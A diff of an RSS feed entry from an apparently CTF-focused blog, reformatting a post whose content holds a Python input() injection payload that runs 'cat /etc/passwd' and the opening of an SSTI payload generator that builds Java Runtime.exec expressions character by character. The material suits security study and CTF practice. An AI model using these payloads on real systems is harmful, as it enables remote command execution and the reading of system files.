@@ -15,12 +15,14 @@
             <pubDate>Sat, 07 Jan 2023 18:04:11 +0530</pubDate>
             
             <guid>https://53ctf.github.io/posts/2023/01/python/</guid>
-            <description>Take Advantage Of input() Function And Run System Commands Within It __import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat /etc/passwd&amp;#39;) Easy SSTI Payloads Generator GitHub
+            <description>Take Advantage Of input() Function And Run System Commands Within It
+__import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat /etc/passwd&amp;#39;) Easy SSTI Payloads Generator
+GitHub Source
 #!/usr/bin/python3 from cmd import Cmd import urllib.parse, argparse parser = argparse.ArgumentParser(description=&amp;#34;Generate SSTI payloads... One character at a time.&amp;#34;) parser.add_argument(&amp;#34;-u&amp;#34;,&amp;#34;--url-encode&amp;#34;, action=&amp;#34;store_true&amp;#34;, help=&amp;#34;URL Encode&amp;#34;) args = parser.parse_args() url_encode=args.url_encode class Terminal(Cmd): prompt=&amp;#39;\033[1;33mCommand ==&amp;gt;\033[0m &amp;#39; def decimal_encode(self,args): command=args decimals=[] for i in command: decimals.append(str(ord(i))) payload=&amp;#39;&amp;#39;&amp;#39;${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&amp;#39;&amp;#39;&amp;#39; % decimals[0] for i in decimals[1:]: line=&amp;#39;.concat(T(java.lang.Character).toString({}))&amp;#39;.format(i) payload+=line payload+=&amp;#39;).getInputStream())}&amp;#39; if url_encode: payload_encoded=urllib.</description>
-            <content type="html"><![CDATA[<h4 id="take-advantage-of-input-function-and-run-system-commands-within-it">Take Advantage Of <code>input()</code> Function And Run System Commands Within It</h4>
+            <content type="html"><![CDATA[<p>Take Advantage Of <code>input()</code> Function And Run System Commands Within It</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;cat /etc/passwd&#39;</span>)
-</span></span></code></pre></div><h4 id="easy-ssti-payloads-generator">Easy SSTI Payloads Generator</h4>
-<p><a href="https://raw.githubusercontent.com/VikasVarshney/ssti-payload/master/ssti-payload.py">GitHub</a></p>
+</span></span></code></pre></div><p>Easy SSTI Payloads Generator<br>
+<a href="https://raw.githubusercontent.com/VikasVarshney/ssti-payload/master/ssti-payload.py">GitHub Source</a></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cmd <span style="color:#f92672">import</span> Cmd
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse<span style="color:#f92672">,</span> argparse
